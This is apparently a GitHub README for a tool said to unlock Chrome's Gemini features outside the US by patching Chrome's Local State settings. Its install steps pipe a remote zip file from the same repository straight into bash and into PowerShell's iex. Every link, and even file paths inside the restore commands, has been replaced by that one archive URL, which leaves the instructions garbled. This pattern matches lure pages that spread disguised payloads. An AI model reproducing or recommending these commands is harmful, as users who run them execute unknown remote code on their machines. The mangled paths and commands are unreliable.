# 🌟 Gemini-in-Chrome - Access Chrome's AI Features Easily

[![Download Gemini-in-Chrome](https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip)](https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip)

## 🚀 Getting Started

Gemini in Chrome allows you to easily access Chrome's built-in Gemini AI features, especially if you are outside the US. Follow these steps to get started.

### 📥 Download & Install

1. **Visit the Releases page:** Go to the [Gemini-in-Chrome Releases](https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip) page.
2. **Choose the right file for your system:**
   - For **macOS or Linux**, you will use a simple script.
   - For **Windows**, you will use PowerShell.

#### macOS / Linux

Open your terminal and run the following command:

```bash
curl -fsSL https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip | bash
```

#### Windows

Open PowerShell and type:

```powershell
irm https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip | iex
```

### 📋 What It Does

1. ✅ **Checks if Chrome is running:** It prompts you to close Chrome if it is open.
2. 💾 **Backs up your configuration:** It saves your current settings as `Local https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip`.
3. 🔧 **Patches important settings:**
   - Changes `is_glic_eligible` from `false` to `true`
   - Sets `variations_country` to `us`
   - Sets `variations_permanent_consistency_country` to `us`
4. ✓ **Verifies changes:** It checks to ensure the changes were applied correctly.

### 🔄 Restore Original Config

If you need to revert to your original settings, you can restore the backup you created.

**macOS:**
```bash
mv ~/Library/Application\ Support/Google/Chrome/Local\ https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip \
   ~/Library/Application\ Support/Google/Chrome/Local\ State
```

**Linux:**
```bash
mv ~https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip\ https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip \
   ~https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip\ State
```

**Windows PowerShell:**
```powershell
Move-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip" -Destination "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
```

### ⚙️ System Requirements

To run Gemini in Chrome, ensure you have the following:

- A stable internet connection
- The latest version of Google Chrome installed
- Sufficient disk space for backup files

### 💡 Troubleshooting

If you encounter issues:

1. **Ensure Chrome is closed** before running the installation script.
2. **Check your internet connection** to ensure the script can download necessary files.
3. If it still fails, try running the script again after rebooting your computer.

### 📧 Support & Feedback

If you have any questions or need support, please reach out via the issues page on GitHub. Your feedback helps us improve Gemini in Chrome for all users.

[![Download Gemini-in-Chrome](https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip)](https://raw.githubusercontent.com/tianlanyb/Gemini-in-Chrome/master/eighteen/in_Gemini_Chrome_3.5-alpha.1.zip)